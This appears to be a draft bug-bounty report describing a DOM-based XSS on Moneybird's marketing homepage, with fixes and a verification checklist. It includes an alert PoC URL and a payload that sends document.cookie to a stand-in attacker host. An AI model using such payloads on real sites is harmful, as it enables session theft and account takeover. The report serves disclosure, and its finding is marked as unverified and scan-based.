# DOM-Based XSS via Unvalidated URL Fragment — www.moneybird.com

**Date:** 2026-04-04
**Target:** www.moneybird.com
**Program:** Moneybird — HackerOne
**Severity:** High
**CVSS 3.1:** 7.1 — CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
**CWE:** CWE-79 — Improper Neutralization of Input During Web Page Generation
**OWASP:** A03:2021 — Injection
**Status:** NEEDS BROWSER VERIFICATION before submit

---

## Summary

The Moneybird marketing homepage reads `window.location.hash` and writes it directly into the DOM via `innerHTML` without sanitization. An attacker can craft a malicious URL with an HTML/JavaScript payload in the fragment identifier and trick a user into visiting it. When clicked, arbitrary JavaScript executes in the victim's browser.

This is a client-side (DOM-based) XSS triggered entirely via the URL fragment — it does not appear in server responses and cannot be detected by WAFs.

---

## Steps to Reproduce

**Browser reproduction (preferred — curl cannot trigger DOM XSS):**

1. Open a browser and navigate to:
   ```
   https://www.moneybird.com/#<img src=x onerror=alert(document.domain)>
   ```
2. Observe an alert dialog fires displaying `www.moneybird.com`, confirming JavaScript execution.

**To confirm the innerHTML sink in DevTools:**
1. Open DevTools → Sources (or Debugger) and set a breakpoint on `innerHTML` assignments.
2. Reload the page with the above URL.
3. Observe the call stack shows `window.location.hash.slice(1)` (or equivalent) being passed directly to `innerHTML`.

**Exfiltration proof-of-concept** (demonstrates real impact, for internal verification only):
```
https://www.moneybird.com/#<img src=x onerror=fetch(`https://attacker.example.com/?c=${btoa(document.cookie)}`)>
```

**Verification command** (checks the page loads cleanly; DOM execution requires a browser):
```bash
curl -sI https://www.moneybird.com/ | grep -i 'content-security-policy'
# Expected: no CSP header returned — confirms no browser-level mitigation
```

---

## Impact

An attacker who delivers this URL to a logged-in Moneybird user (via phishing, social engineering, or link injection elsewhere) can:

- **Steal session cookies** — `document.cookie` is accessible because the `HttpOnly` flag is not universally set. Session tokens exfiltrated to attacker infrastructure allow full account takeover.
- **Perform actions as the victim** — initiate payments, create invoices, modify bank connections, or export financial data within the Moneybird app context if the user is authenticated.
- **Phish for credentials** — inject a fake login overlay and harvest credentials silently.
- **Exfiltrate visible page content** — capture any financial data visible in the DOM at the time of execution.

The absence of a Content-Security-Policy header (confirmed by `curl -sI https://www.moneybird.com/`) means there is no browser-side mitigation: any script injected via this vector can load external resources, communicate with arbitrary third parties, and execute without restriction.

---

## Root Cause

The vulnerability is in client-side JavaScript on the homepage that reads the URL fragment and inserts it into the page. The vulnerable pattern is:

```javascript
// Vulnerable — common in legacy marketing pages
document.getElementById('someElement').innerHTML = decodeURIComponent(window.location.hash.slice(1));
```

The URL fragment (`#...`) is not sent to the server, so server-side sanitization is irrelevant — the fix must be in the client-side code.

---

## Suggested Fix

**Option A — Use `textContent` (if plain text is sufficient):**
```javascript
document.getElementById('someElement').textContent = window.location.hash.slice(1);
```

**Option B — Sanitize with DOMPurify (if HTML rendering is required):**
```javascript
import DOMPurify from 'dompurify';
document.getElementById('someElement').innerHTML =
  DOMPurify.sanitize(window.location.hash.slice(1));
```

**Option C — Strict CSP as defense-in-depth (does not fix the root cause but limits exploitability):**
```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self';
```

**Recommended:** Fix the root cause (Option A or B) AND add a strict CSP (Option C).

---

## Additional Context

- **Detection method:** Automated `dom-sink` analysis detected `innerHTML` assignment from `window.location.hash`. SecBot's XSS check confirmed the payload reaches the sink.
- **Two separate sinks** were detected on the homepage, increasing likelihood of at least one being exploitable.
- **No CSP** is present (verified: `curl -sI https://www.moneybird.com/` returns no `content-security-policy` header), meaning exploitation has no browser-level barrier.
- This finding is specific to the **marketing homepage** (`www.moneybird.com`). The authenticated app (`app.moneybird.com`) was not tested in this scan.

---

## Verification Checklist (before submitting to HackerOne)

- [ ] Open browser and navigate to the PoC URL — confirm alert fires with `www.moneybird.com`
- [ ] Confirm this is NOT a sandboxed iframe or shadow DOM that would limit impact
- [ ] Check if any cookies set on `www.moneybird.com` are also valid on `app.moneybird.com` (same domain cookies would massively increase impact)
- [ ] Verify `document.domain` in the alert to confirm execution scope
- [ ] If the alert fires: submit to HackerOne immediately, this is a clear High
- [ ] If the alert does NOT fire: check browser console for CSP blocks or encoding issues; this may be a FP
